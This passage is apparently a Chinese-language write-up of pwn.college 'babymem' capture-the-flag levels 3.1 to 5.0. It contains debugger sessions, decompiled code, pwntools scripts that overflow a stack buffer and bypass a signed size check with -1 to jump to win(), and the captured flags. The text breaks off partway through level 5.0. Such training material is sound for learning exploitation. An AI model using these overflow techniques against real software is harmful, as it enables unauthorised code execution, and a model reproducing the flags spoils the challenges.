pwndbg> i fun
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x00000000004010f0  putchar@plt
0x0000000000401100  __errno_location@plt
0x0000000000401110  puts@plt
0x0000000000401120  write@plt
0x0000000000401130  printf@plt
0x0000000000401140  geteuid@plt
0x0000000000401150  read@plt
0x0000000000401160  setvbuf@plt
0x0000000000401170  open@plt
0x0000000000401180  __isoc99_scanf@plt
0x0000000000401190  exit@plt
0x00000000004011a0  strerror@plt
0x00000000004011b0  _start
0x00000000004011e0  _dl_relocate_static_pie
0x00000000004011f0  deregister_tm_clones
0x0000000000401220  register_tm_clones
0x0000000000401260  __do_global_dtors_aux
0x0000000000401290  frame_dummy
0x0000000000401296  bin_padding
0x0000000000401a0b  win
0x0000000000401b12  challenge
0x0000000000401c64  main
0x0000000000401d40  __libc_csu_init
0x0000000000401db0  __libc_csu_fini
0x0000000000401db8  _fini
pwndbg> disass challenge
Dump of assembler code for function challenge:
   0x0000000000401b12 <+0>: endbr64
   0x0000000000401b16 <+4>: push   rbp
   0x0000000000401b17 <+5>: mov    rbp,rsp
   0x0000000000401b1a <+8>: sub    rsp,0xb0
   0x0000000000401b21 <+15>: mov    DWORD PTR [rbp-0x94],edi
   0x0000000000401b27 <+21>: mov    QWORD PTR [rbp-0xa0],rsi
   0x0000000000401b2e <+28>: mov    QWORD PTR [rbp-0xa8],rdx
   0x0000000000401b35 <+35>: mov    QWORD PTR [rbp-0x80],0x0
   0x0000000000401b3d <+43>: mov    QWORD PTR [rbp-0x78],0x0
   0x0000000000401b45 <+51>: mov    QWORD PTR [rbp-0x70],0x0
   0x0000000000401b4d <+59>: mov    QWORD PTR [rbp-0x68],0x0
   0x0000000000401b55 <+67>: mov    QWORD PTR [rbp-0x60],0x0
   0x0000000000401b5d <+75>: mov    QWORD PTR [rbp-0x58],0x0
   0x0000000000401b65 <+83>: mov    QWORD PTR [rbp-0x50],0x0
   0x0000000000401b6d <+91>: mov    QWORD PTR [rbp-0x48],0x0
   0x0000000000401b75 <+99>: mov    QWORD PTR [rbp-0x40],0x0
   0x0000000000401b7d <+107>: mov    QWORD PTR [rbp-0x38],0x0
   0x0000000000401b85 <+115>: mov    QWORD PTR [rbp-0x30],0x0
   0x0000000000401b8d <+123>: mov    QWORD PTR [rbp-0x28],0x0
   0x0000000000401b95 <+131>: mov    QWORD PTR [rbp-0x20],0x0
   0x0000000000401b9d <+139>: mov    DWORD PTR [rbp-0x18],0x0
   0x0000000000401ba4 <+146>: mov    WORD PTR [rbp-0x14],0x0
   0x0000000000401baa <+152>: lea    rax,[rbp-0x80]
   0x0000000000401bae <+156>: mov    QWORD PTR [rbp-0x8],rax
   0x0000000000401bb2 <+160>: mov    QWORD PTR [rbp-0x88],0x0
   0x0000000000401bbd <+171>: lea    rdi,[rip+0x548]        # 0x40210c
   0x0000000000401bc4 <+178>: mov    eax,0x0
   0x0000000000401bc9 <+183>: call   0x401130 <printf@plt>
   0x0000000000401bce <+188>: lea    rax,[rbp-0x88]
   0x0000000000401bd5 <+195>: mov    rsi,rax
   0x0000000000401bd8 <+198>: lea    rdi,[rip+0x53c]        # 0x40211b
   0x0000000000401bdf <+205>: mov    eax,0x0
   0x0000000000401be4 <+210>: call   0x401180 <__isoc99_scanf@plt>
   0x0000000000401be9 <+215>: mov    rax,QWORD PTR [rbp-0x88]
   0x0000000000401bf0 <+222>: mov    rsi,rax
   0x0000000000401bf3 <+225>: lea    rdi,[rip+0x526]        # 0x402120
   0x0000000000401bfa <+232>: mov    eax,0x0
   0x0000000000401bff <+237>: call   0x401130 <printf@plt>
   0x0000000000401c04 <+242>: mov    rdx,QWORD PTR [rbp-0x88]
   0x0000000000401c0b <+249>: mov    rax,QWORD PTR [rbp-0x8]
   0x0000000000401c0f <+253>: mov    rsi,rax
   0x0000000000401c12 <+256>: mov    edi,0x0
   0x0000000000401c17 <+261>: call   0x401150 <read@plt>
   0x0000000000401c1c <+266>: mov    DWORD PTR [rbp-0xc],eax
   0x0000000000401c1f <+269>: cmp    DWORD PTR [rbp-0xc],0x0
   0x0000000000401c23 <+273>: jns    0x401c51 <challenge+319>
   0x0000000000401c25 <+275>: call   0x401100 <__errno_location@plt>
   0x0000000000401c2a <+280>: mov    eax,DWORD PTR [rax]
   0x0000000000401c2c <+282>: mov    edi,eax
   0x0000000000401c2e <+284>: call   0x4011a0 <strerror@plt>
   0x0000000000401c33 <+289>: mov    rsi,rax
   0x0000000000401c36 <+292>: lea    rdi,[rip+0x50b]        # 0x402148
   0x0000000000401c3d <+299>: mov    eax,0x0
   0x0000000000401c42 <+304>: call   0x401130 <printf@plt>
   0x0000000000401c47 <+309>: mov    edi,0x1
   0x0000000000401c4c <+314>: call   0x401190 <exit@plt>
   0x0000000000401c51 <+319>: lea    rdi,[rip+0x514]        # 0x40216c
   0x0000000000401c58 <+326>: call   0x401110 <puts@plt>
   0x0000000000401c5d <+331>: mov    eax,0x0
   0x0000000000401c62 <+336>: leave
   0x0000000000401c63 <+337>: ret
End of assembler dump.
pwndbg> b *challenge+261
Breakpoint 1 at 0x401c17
pwndbg> r
Starting program: /home/cub3y0nd/Projects/pwn.college/babymem-level-3-1
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".
###
### Welcome to /home/cub3y0nd/Projects/pwn.college/babymem-level-3-1!
###

Payload size: 1771
Send your payload (up to 1771 bytes)!

Breakpoint 1, 0x0000000000401c17 in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────
 RAX  0x7fffffffd130 ◂— 0
 RBX  0x7fffffffe308 —▸ 0x7fffffffe6bb ◂— '/home/cub3y0nd/Projects/pwn.college/babymem-level-3-1'
 RCX  0
 RDX  0x6eb
 RDI  0
 RSI  0x7fffffffd130 ◂— 0
 R8   0x75
 R9   0xfffffffc
 R10  0
 R11  0x202
 R12  1
 R13  0
 R14  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0
 R15  0
 RBP  0x7fffffffd1b0 —▸ 0x7fffffffe1e0 —▸ 0x7fffffffe280 —▸ 0x7fffffffe2e0 ◂— 0
 RSP  0x7fffffffd100 ◂— 0xa /* '\n' */
 RIP  0x401c17 (challenge+261) ◂— call 0x401150
────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────
 ► 0x401c17 <challenge+261>    call   read@plt                    <read@plt>
        fd: 0 (/dev/pts/2)
        buf: 0x7fffffffd130 ◂— 0
        nbytes: 0x6eb

   0x401c1c <challenge+266>    mov    dword ptr [rbp - 0xc], eax
   0x401c1f <challenge+269>    cmp    dword ptr [rbp - 0xc], 0
   0x401c23 <challenge+273>    jns    challenge+319               <challenge+319>

   0x401c25 <challenge+275>    call   __errno_location@plt        <__errno_location@plt>

   0x401c2a <challenge+280>    mov    eax, dword ptr [rax]
   0x401c2c <challenge+282>    mov    edi, eax
   0x401c2e <challenge+284>    call   strerror@plt                <strerror@plt>

   0x401c33 <challenge+289>    mov    rsi, rax
   0x401c36 <challenge+292>    lea    rdi, [rip + 0x50b]     RDI => 0x402148 ◂— 'ERROR: Failed to read input -- %s!\n'
   0x401c3d <challenge+299>    mov    eax, 0                 EAX => 0
─────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp     0x7fffffffd100 ◂— 0xa /* '\n' */
01:0008│-0a8     0x7fffffffd108 —▸ 0x7fffffffe318 —▸ 0x7fffffffe6f1 ◂— 'SHELL=/usr/bin/zsh'
02:0010│-0a0     0x7fffffffd110 —▸ 0x7fffffffe308 —▸ 0x7fffffffe6bb ◂— '/home/cub3y0nd/Projects/pwn.college/babymem-level-3-1'
03:0018│-098     0x7fffffffd118 ◂— 0x100000000
04:0020│-090     0x7fffffffd120 —▸ 0x7fffffffd140 ◂— 0
05:0028│-088     0x7fffffffd128 ◂— 0x6eb
06:0030│ rax rsi 0x7fffffffd130 ◂— 0
07:0038│-078     0x7fffffffd138 ◂— 0
───────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────
 ► 0         0x401c17 challenge+261
   1         0x401d2a main+198
   2   0x7ffff7dcae08
   3   0x7ffff7dcaecc __libc_start_main+140
   4         0x4011de _start+46
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> i frame
Stack level 0, frame at 0x7fffffffd1c0:
 rip = 0x401c17 in challenge; saved rip = 0x401d2a
 called by frame at 0x7fffffffe1f0
 Arglist at 0x7fffffffd1b0, args:
 Locals at 0x7fffffffd1b0, Previous frame's sp is 0x7fffffffd1c0
 Saved registers:
  rbp at 0x7fffffffd1b0, rip at 0x7fffffffd1b8
pwndbg> distance 0x7fffffffd130 0x7fffffffd1b8
0x7fffffffd130->0x7fffffffd1b8 is 0x88 bytes (0x11 words)
```

很显然这是想让我们覆盖返回地址控制程序执行流程，达到执行 `win` 的目的。

## Exploit

```python
#!/usr/bin/python3

from pwn import context, ELF, process, remote, gdb, p64

context(log_level="debug", terminal="kitty")

FILE = "./babymem-level-3-1"
HOST = "pwn.college"
PORT = 1337

gdbscript = """
c
"""


def launch(local=True, debug=False):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug([elf.path], gdbscript=gdbscript)
        else:
            return process([elf.path])
    else:
        return remote(HOST, PORT)


target = launch()

payload = b"".ljust(0x88, b"A") + p64(0x401A0B)
payload_size = str(len(payload)).encode()

target.recvuntil(b"Payload size: ")
target.sendline(payload_size)
target.recvuntil(b"Send your payload")
target.send(payload)

target.recvall()
```

## Flag

Flag: `pwn.college{k2xNTDjO8L-Rt_oy5sU-i2dFj1y.0FN5IDL5cTNxgzW}`

# Level 4.0

## Information

- Category: Pwn

## Description

> Overflow a buffer and smash the stack to obtain the flag, but this time bypass a check designed to prevent you from doing so!

## Write-up

```c {7, 55} ins={60-64} del={85} collapse={1-3, 11-51, 68-81, 89-108}
__int64 __fastcall challenge(int a1, __int64 a2, __int64 a3)
{
  int *v3; // rax
  char *v4; // rax
  _QWORD v6[3]; // [rsp+0h] [rbp-B0h] BYREF
  int v7; // [rsp+1Ch] [rbp-94h]
  size_t nbytes[15]; // [rsp+2Ch] [rbp-84h] BYREF
  int v9; // [rsp+A4h] [rbp-Ch]
  void *buf; // [rsp+A8h] [rbp-8h]
  __int64 savedregs; // [rsp+B0h] [rbp+0h] BYREF
  _UNKNOWN *retaddr; // [rsp+B8h] [rbp+8h] BYREF

  v7 = a1;
  v6[2] = a2;
  v6[1] = a3;
  buf = (char *)nbytes + 4;
  memset(nbytes, 0, 110);
  puts("The challenge() function has just been launched!");
  sp_ = (__int64)v6;
  bp_ = (__int64)&savedregs;
  sz_ = ((unsigned __int64)((char *)&savedregs - (char *)v6) >> 3) + 2;
  rp_ = (__int64)&retaddr;
  puts("Before we do anything, let's take a look at challenge()'s stack frame:");
  DUMP_STACK(sp_, sz_);
  printf("Our stack pointer points to %p, and our base pointer points to %p.\n", (const void *)sp_, (const void *)bp_);
  printf("This means that we have (decimal) %d 8-byte words in our stack frame,\n", sz_);
  puts("including the saved base pointer and the saved return address, for a");
  printf("total of %d bytes.\n", 8 * sz_);
  printf("The input buffer begins at %p, partway through the stack frame,\n", buf);
  puts("(\"above\" it in the stack are other local variables used by the function).");
  puts("Your input will be read into this buffer.");
  printf("The buffer is %d bytes long, but the program will let you provide an arbitrarily\n", 106);
  puts("large input length, and thus overflow the buffer.\n");
  puts("In this level, there is no \"win\" variable.");
  puts("You will need to force the program to execute the win() function");
  puts("by directly overflowing into the stored return address back to main,");
  printf(
    "which is stored at %p, %d bytes after the start of your input buffer.\n",
    (const void *)rp_,
    rp_ - (_DWORD)buf);
  printf(
    "That means that you will need to input at least %d bytes (%d to fill the buffer,\n",
    rp_ - (_DWORD)buf + 8,
    106);
  printf("%d to fill other stuff stored between the buffer and the return address,\n", rp_ - (_DWORD)buf - 106);
  puts("and 8 that will overwrite the return address).\n");
  puts("We have disabled the following standard memory corruption mitigations for this challenge:");
  puts("- the canary is disabled, otherwise you would corrupt it before");
  puts("overwriting the return address, and the program would abort.");
  puts("- the binary is *not* position independent. This means that it will be");
  puts("located at the same spot every time it is run, which means that by");
  puts("analyzing the binary (using objdump or reading this output), you can");
  puts("know the exact value that you need to overwrite the return address with.\n");
  printf("Payload size: ");
  __isoc99_scanf("%i", nbytes);
  puts("This challenge is more careful: it will check to make sure you");
  puts("don't want to provide so much data that the input buffer will");
  puts("overflow. But recall twos compliment, look at how the check is");
  puts("implemented, and try to beat it!");
  if ( SLODWORD(nbytes[0]) > 106 )
  {
    puts("Provided size is too large!");
    exit(1);
  }
  puts("You made it past the check! Because the read() call will interpret");
  puts("your size differently than the check above, the resulting read will");
  puts("be unstable and might fail. You will likely have to try this several");
  puts("times before your input is actually read.");
  printf("You have chosen to send %i bytes of input!\n", LODWORD(nbytes[0]));
  printf("This will allow you to write from %p (the start of the input buffer)\n", buf);
  printf(
    "right up to (but not including) %p (which is %d bytes beyond the end of the buffer).\n",
    (char *)buf + SLODWORD(nbytes[0]),
    LODWORD(nbytes[0]) - 106);
  printf("Of these, you will overwrite %d bytes into the return address.\n", (_DWORD)buf + LODWORD(nbytes[0]) - rp_);
  puts("If that number is greater than 8, you will overwrite the entire return address.\n");
  puts("You will want to overwrite the return value from challenge()");
  printf("(located at %p, %d bytes past the start of the input buffer)\n", (const void *)rp_, rp_ - (_DWORD)buf);
  printf("with %p, which is the address of the win() function.\n", win);
  puts("This will cause challenge() to return directly into the win() function,");
  puts("which will in turn give you the flag.");
  puts("Keep in mind that you will need to write the address of the win() function");
  puts("in little-endian (bytes backwards) so that it is interpreted properly.\n");
  printf("Send your payload (up to %i bytes)!\n", LODWORD(nbytes[0]));
  v9 = read(0, buf, LODWORD(nbytes[0]));
  if ( v9 < 0 )
  {
    v3 = __errno_location();
    v4 = strerror(*v3);
    printf("ERROR: Failed to read input -- %s!\n", v4);
    exit(1);
  }
  printf("You sent %d bytes!\n", v9);
  puts("Let's see what happened with the stack:\n");
  DUMP_STACK(sp_, sz_);
  puts("The program's memory status:");
  printf("- the input buffer starts at %p\n", buf);
  printf("- the saved frame pointer (of main) is at %p\n", (const void *)bp_);
  printf("- the saved return address (previously to main) is at %p\n", (const void *)rp_);
  printf("- the saved return address is now pointing to %p.\n", *(const void **)rp_);
  printf("- the address of win() is %p.\n", win);
  putchar(10);
  puts("If you have managed to overwrite the return address with the correct value,");
  puts("challenge() will jump straight to win() when it returns.");
  printf("Let's try it now!\n\n");
  puts("Goodbye!");
  return 0LL;
}
```

```c
// ...

if ( SLODWORD(nbytes[0]) > 106 )
{
  puts("Provided size is too large!");
  exit(1);
}
```

`SLODWORD(nbytes[0]) > 106` 则退出程序。但是我们的 payload 为 144 bytes（提示信息中已经说明了 payload 长度），因此显然不能在 payload size 中直接输入 144。

为了绕过这一点，我们注意到 `nbytes` 的类型为 `size_t`：

```c del="size_t"
// ...

size_t nbytes[15]; // [rsp+2Ch] [rbp-84h] BYREF
```

因为 `size_t` 是无符号整形，所以如果我们提供一个负数，它将会被隐式地转换为无符号数。

根据补码规则我们知道，`-1` 会被表示成 `0xffffffff`，如果把它看作无符号数，这无疑是相当大的一个数字。

又因为程序使用 `SLODWORD` 来判断，这是获取一个有符号数的低 `DWORD`。

那么如果我们输入 `-1` ，则程序最后执行 `SLODWORD(nbytes[0]) > 106` 时判断的会是 `0xffffffff` 和 `106` 的大小。很显然前者小于后者，成功绕过了这个 `if` 判断。

而由于有符号数被隐式转换为无符号数保存在了 `nbytes` 中，故我们获得了一个相当大的输入范围。

正好 `read` 获取用户输入的时候也把最大输入大小视作无符号数，毕竟输入大小显然不可能为负数。但这也为我们的攻击带来了可能：

```c del="LODWORD(nbytes[0])"
// ...

v9 = read(0, buf, LODWORD(nbytes[0]));
```

## Exploit

```python
#!/usr/bin/python3

from pwn import context, ELF, process, remote, gdb, p64

context(log_level="debug", terminal="kitty")

FILE = "./babymem-level-4-0"
HOST = "pwn.college"
PORT = 1337

gdbscript = """
c
"""


def launch(local=True, debug=False):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug([elf.path], gdbscript=gdbscript)
        else:
            return process([elf.path])
    else:
        return remote(HOST, PORT)


target = launch()

payload = b"".ljust(0x88, b"A") + p64(0x4020F3)

target.recvuntil(b"Payload size: ")
target.sendline(b"-1")
target.recvuntil(b"Send your payload")
target.send(payload)

target.recvall()
```

## Flag

Flag: `pwn.college{YWYtWHsecMbA0xSnI1_Yfj-kjlB.0VN5IDL5cTNxgzW}`

# Level 4.1

## Information

- Category: Pwn

## Description

> Overflow a buffer and smash the stack to obtain the flag, but this time bypass a check designed to prevent you from doing so!

## Write-up

```c ins={13-17} del={19} collapse={1-9, 23-29}
__int64 challenge()
{
  int *v0; // rax
  char *v1; // rax
  size_t nbytes[7]; // [rsp+2Ch] [rbp-44h] BYREF
  int v4; // [rsp+64h] [rbp-Ch]
  void *buf; // [rsp+68h] [rbp-8h]

  buf = (char *)nbytes + 4;
  memset(nbytes, 0, 50);
  printf("Payload size: ");
  __isoc99_scanf("%i", nbytes);
  if ( SLODWORD(nbytes[0]) > 46 )
  {
    puts("Provided size is too large!");
    exit(1);
  }
  printf("Send your payload (up to %i bytes)!\n", LODWORD(nbytes[0]));
  v4 = read(0, buf, LODWORD(nbytes[0]));
  if ( v4 < 0 )
  {
    v0 = __errno_location();
    v1 = strerror(*v0);
    printf("ERROR: Failed to read input -- %s!\n", v1);
    exit(1);
  }
  puts("Goodbye!");
  return 0LL;
}
```

和上一题思路相同，都是通过有符号数隐式转换为无符号数绕过 payload 长度判断，然后覆盖返回地址。几乎没区别，这里就不再赘述分析过程了。

```asm wrap=false showLineNumbers=false ins="0x0000000000401704" collapse={2-21, 29-30, 36-90, 109-128, 133-162}
pwndbg> i fun
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x00000000004010f0  putchar@plt
0x0000000000401100  __errno_location@plt
0x0000000000401110  puts@plt
0x0000000000401120  write@plt
0x0000000000401130  printf@plt
0x0000000000401140  geteuid@plt
0x0000000000401150  read@plt
0x0000000000401160  setvbuf@plt
0x0000000000401170  open@plt
0x0000000000401180  __isoc99_scanf@plt
0x0000000000401190  exit@plt
0x00000000004011a0  strerror@plt
0x00000000004011b0  _start
0x00000000004011e0  _dl_relocate_static_pie
0x00000000004011f0  deregister_tm_clones
0x0000000000401220  register_tm_clones
0x0000000000401260  __do_global_dtors_aux
0x0000000000401290  frame_dummy
0x0000000000401296  bin_padding
0x0000000000401704  win
0x000000000040180b  challenge
0x0000000000401921  main
0x0000000000401a00  __libc_csu_init
0x0000000000401a70  __libc_csu_fini
0x0000000000401a78  _fini
pwndbg> disass challenge
Dump of assembler code for function challenge:
   0x000000000040180b <+0>: endbr64
   0x000000000040180f <+4>: push   rbp
   0x0000000000401810 <+5>: mov    rbp,rsp
   0x0000000000401813 <+8>: sub    rsp,0x70
   0x0000000000401817 <+12>: mov    DWORD PTR [rbp-0x54],edi
   0x000000000040181a <+15>: mov    QWORD PTR [rbp-0x60],rsi
   0x000000000040181e <+19>: mov    QWORD PTR [rbp-0x68],rdx
   0x0000000000401822 <+23>: mov    QWORD PTR [rbp-0x40],0x0
   0x000000000040182a <+31>: mov    QWORD PTR [rbp-0x38],0x0
   0x0000000000401832 <+39>: mov    QWORD PTR [rbp-0x30],0x0
   0x000000000040183a <+47>: mov    QWORD PTR [rbp-0x28],0x0
   0x0000000000401842 <+55>: mov    QWORD PTR [rbp-0x20],0x0
   0x000000000040184a <+63>: mov    DWORD PTR [rbp-0x18],0x0
   0x0000000000401851 <+70>: mov    WORD PTR [rbp-0x14],0x0
   0x0000000000401857 <+76>: lea    rax,[rbp-0x40]
   0x000000000040185b <+80>: mov    QWORD PTR [rbp-0x8],rax
   0x000000000040185f <+84>: mov    DWORD PTR [rbp-0x44],0x0
   0x0000000000401866 <+91>: lea    rdi,[rip+0x89f]        # 0x40210c
   0x000000000040186d <+98>: mov    eax,0x0
   0x0000000000401872 <+103>: call   0x401130 <printf@plt>
   0x0000000000401877 <+108>: lea    rax,[rbp-0x44]
   0x000000000040187b <+112>: mov    rsi,rax
   0x000000000040187e <+115>: lea    rdi,[rip+0x896]        # 0x40211b
   0x0000000000401885 <+122>: mov    eax,0x0
   0x000000000040188a <+127>: call   0x401180 <__isoc99_scanf@plt>
   0x000000000040188f <+132>: mov    eax,DWORD PTR [rbp-0x44]
   0x0000000000401892 <+135>: cmp    eax,0x2e
   0x0000000000401895 <+138>: jle    0x4018ad <challenge+162>
   0x0000000000401897 <+140>: lea    rdi,[rip+0x880]        # 0x40211e
   0x000000000040189e <+147>: call   0x401110 <puts@plt>
   0x00000000004018a3 <+152>: mov    edi,0x1
   0x00000000004018a8 <+157>: call   0x401190 <exit@plt>
   0x00000000004018ad <+162>: mov    eax,DWORD PTR [rbp-0x44]
   0x00000000004018b0 <+165>: mov    esi,eax
   0x00000000004018b2 <+167>: lea    rdi,[rip+0x887]        # 0x402140
   0x00000000004018b9 <+174>: mov    eax,0x0
   0x00000000004018be <+179>: call   0x401130 <printf@plt>
   0x00000000004018c3 <+184>: mov    eax,DWORD PTR [rbp-0x44]
   0x00000000004018c6 <+187>: mov    edx,eax
   0x00000000004018c8 <+189>: mov    rax,QWORD PTR [rbp-0x8]
   0x00000000004018cc <+193>: mov    rsi,rax
   0x00000000004018cf <+196>: mov    edi,0x0
   0x00000000004018d4 <+201>: call   0x401150 <read@plt>
   0x00000000004018d9 <+206>: mov    DWORD PTR [rbp-0xc],eax
   0x00000000004018dc <+209>: cmp    DWORD PTR [rbp-0xc],0x0
   0x00000000004018e0 <+213>: jns    0x40190e <challenge+259>
   0x00000000004018e2 <+215>: call   0x401100 <__errno_location@plt>
   0x00000000004018e7 <+220>: mov    eax,DWORD PTR [rax]
   0x00000000004018e9 <+222>: mov    edi,eax
   0x00000000004018eb <+224>: call   0x4011a0 <strerror@plt>
   0x00000000004018f0 <+229>: mov    rsi,rax
   0x00000000004018f3 <+232>: lea    rdi,[rip+0x86e]        # 0x402168
   0x00000000004018fa <+239>: mov    eax,0x0
   0x00000000004018ff <+244>: call   0x401130 <printf@plt>
   0x0000000000401904 <+249>: mov    edi,0x1
   0x0000000000401909 <+254>: call   0x401190 <exit@plt>
   0x000000000040190e <+259>: lea    rdi,[rip+0x877]        # 0x40218c
   0x0000000000401915 <+266>: call   0x401110 <puts@plt>
   0x000000000040191a <+271>: mov    eax,0x0
   0x000000000040191f <+276>: leave
   0x0000000000401920 <+277>: ret
End of assembler dump.
pwndbg> b *challenge+201
Breakpoint 1 at 0x4018d4
pwndbg> r
Starting program: /home/cub3y0nd/Projects/pwn.college/babymem-level-4-1
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".
###
### Welcome to /home/cub3y0nd/Projects/pwn.college/babymem-level-4-1!
###

Payload size: 16
Send your payload (up to 16 bytes)!

Breakpoint 1, 0x00000000004018d4 in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────
 RAX  0x7fffffffd170 ◂— 0
 RBX  0x7fffffffe308 —▸ 0x7fffffffe6bb ◂— '/home/cub3y0nd/Projects/pwn.college/babymem-level-4-1'
 RCX  0
 RDX  0x10
 RDI  0
 RSI  0x7fffffffd170 ◂— 0
 R8   0x69
 R9   0xfffffffe
 R10  0
 R11  0x202
 R12  1
 R13  0
 R14  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0
 R15  0
 RBP  0x7fffffffd1b0 —▸ 0x7fffffffe1e0 —▸ 0x7fffffffe280 —▸ 0x7fffffffe2e0 ◂— 0
 RSP  0x7fffffffd140 —▸ 0x7fffffffd170 ◂— 0
 RIP  0x4018d4 (challenge+201) ◂— call 0x401150
────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────
 ► 0x4018d4 <challenge+201>    call   read@plt                    <read@plt>
        fd: 0 (/dev/pts/2)
        buf: 0x7fffffffd170 ◂— 0
        nbytes: 0x10

   0x4018d9 <challenge+206>    mov    dword ptr [rbp - 0xc], eax
   0x4018dc <challenge+209>    cmp    dword ptr [rbp - 0xc], 0
   0x4018e0 <challenge+213>    jns    challenge+259               <challenge+259>

   0x4018e2 <challenge+215>    call   __errno_location@plt        <__errno_location@plt>

   0x4018e7 <challenge+220>    mov    eax, dword ptr [rax]
   0x4018e9 <challenge+222>    mov    edi, eax
   0x4018eb <challenge+224>    call   strerror@plt                <strerror@plt>

   0x4018f0 <challenge+229>    mov    rsi, rax
   0x4018f3 <challenge+232>    lea    rdi, [rip + 0x86e]     RDI => 0x402168 ◂— 'ERROR: Failed to read input -- %s!\n'
   0x4018fa <challenge+239>    mov    eax, 0                 EAX => 0
──────────────────────────────────────[ STACK ]──────────────────────────────────────
00:0000│ rsp     0x7fffffffd140 —▸ 0x7fffffffd170 ◂— 0
01:0008│-068     0x7fffffffd148 —▸ 0x7fffffffe318 —▸ 0x7fffffffe6f1 ◂— 'SHELL=/usr/bin/zsh'
02:0010│-060     0x7fffffffd150 —▸ 0x7fffffffe308 —▸ 0x7fffffffe6bb ◂— '/home/cub3y0nd/Projects/pwn.college/babymem-level-4-1'
03:0018│-058     0x7fffffffd158 ◂— 0x10000000a /* '\n' */
04:0020│-050     0x7fffffffd160 —▸ 0x7ffff7f8d5c0 (_IO_2_1_stdout_) ◂— 0xfbad2887
05:0028│-048     0x7fffffffd168 ◂— 0x1000404020 /* ' @@' */
06:0030│ rax rsi 0x7fffffffd170 ◂— 0
07:0038│-038     0x7fffffffd178 ◂— 0
────────────────────────────────────[ BACKTRACE ]────────────────────────────────────
 ► 0         0x4018d4 challenge+201
   1         0x4019e7 main+198
   2   0x7ffff7dcae08
   3   0x7ffff7dcaecc __libc_start_main+140
   4         0x4011de _start+46
─────────────────────────────────────────────────────────────────────────────────────
pwndbg> i frame
Stack level 0, frame at 0x7fffffffd1c0:
 rip = 0x4018d4 in challenge; saved rip = 0x4019e7
 called by frame at 0x7fffffffe1f0
 Arglist at 0x7fffffffd1b0, args:
 Locals at 0x7fffffffd1b0, Previous frame's sp is 0x7fffffffd1c0
 Saved registers:
  rbp at 0x7fffffffd1b0, rip at 0x7fffffffd1b8
pwndbg> distance 0x7fffffffd170 0x7fffffffd1b8
0x7fffffffd170->0x7fffffffd1b8 is 0x48 bytes (0x9 words)
```

## Exploit

```python
#!/usr/bin/python3

from pwn import context, ELF, process, remote, gdb, p64

context(log_level="debug", terminal="kitty")

FILE = "./babymem-level-4-1"
HOST = "pwn.college"
PORT = 1337

gdbscript = """
c
"""


def launch(local=True, debug=False):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug([elf.path], gdbscript=gdbscript)
        else:
            return process([elf.path])
    else:
        return remote(HOST, PORT)


target = launch()

payload = b"".ljust(0x48, b"A") + p64(0x401704)

target.recvuntil(b"Payload size: ")
target.sendline(b"-1")
target.recvuntil(b"Send your payload")
target.send(payload)

target.recvall()
```

## Flag

Flag: `pwn.college{M-FCJzqtx7cmDX7yqpyi7jADAMM.0lN5IDL5cTNxgzW}`

# Level 5.0

## Information

- Category: Pwn

## Description

> Overflow a buffer and smash the stack to obtain the flag, but this time bypass another check designed to prevent you from doing so!

## Write-up

```c {64, 68} ins={65-66, 69-70, 71-72} del={73, 91} collapse={1-60, 77-87, 95-114}
__int64 __fastcall challenge(int a1, __int64 a2, __int64 a3)
{
  int *v3; // rax
  char *v4; // rax
  _QWORD v6[3]; // [rsp+0h] [rbp-B0h] BYREF
  int v7; // [rsp+1Ch] [rbp-94h]
  unsigned int v8; // [rsp+28h] [rbp-88h] BYREF
  unsigned int v9; // [rsp+2Ch] [rbp-84h] BYREF
  _QWORD v10[12]; // [rsp+30h] [rbp-80h] BYREF
  __int16 v11; // [rsp+90h] [rbp-20h]
  int v12; // [rsp+9Ch] [rbp-14h]
  size_t nbytes; // [rsp+A0h] [rbp-10h]
  void *buf; // [rsp+A8h] [rbp-8h]
  __int64 savedregs; // [rsp+B0h] [rbp+0h] BYREF
  _UNKNOWN *retaddr; // [rsp+B8h] [rbp+8h] BYREF

  v7 = a1;
  v6[2] = a2;
  v6[1] = a3;
  memset(v10, 0, sizeof(v10));
  v11 = 0;
  buf = v10;
  nbytes = 0LL;
  puts("The challenge() function has just been launched!");
  sp_ = (__int64)v6;
  bp_ = (__int64)&savedregs;
  sz_ = ((unsigned __int64)((char *)&savedregs - (char *)v6) >> 3) + 2;
  rp_ = (__int64)&retaddr;
  puts("Before we do anything, let's take a look at challenge()'s stack frame:");
  DUMP_STACK(sp_, sz_);
  printf("Our stack pointer points to %p, and our base pointer points to %p.\n", (const void *)sp_, (const void *)bp_);
  printf("This means that we have (decimal) %d 8-byte words in our stack frame,\n", sz_);
  puts("including the saved base pointer and the saved return address, for a");
  printf("total of %d bytes.\n", 8 * sz_);
  printf("The input buffer begins at %p, partway through the stack frame,\n", buf);
  puts("(\"above\" it in the stack are other local variables used by the function).");
  puts("Your input will be read into this buffer.");
  printf("The buffer is %d bytes long, but the program will let you provide an arbitrarily\n", 98);
  puts("large input length, and thus overflow the buffer.\n");
  puts("In this level, there is no \"win\" variable.");
  puts("You will need to force the program to execute the win() function");
  puts("by directly overflowing into the stored return address back to main,");
  printf(
    "which is stored at %p, %d bytes after the start of your input buffer.\n",
    (const void *)rp_,
    rp_ - (_DWORD)buf);
  printf(
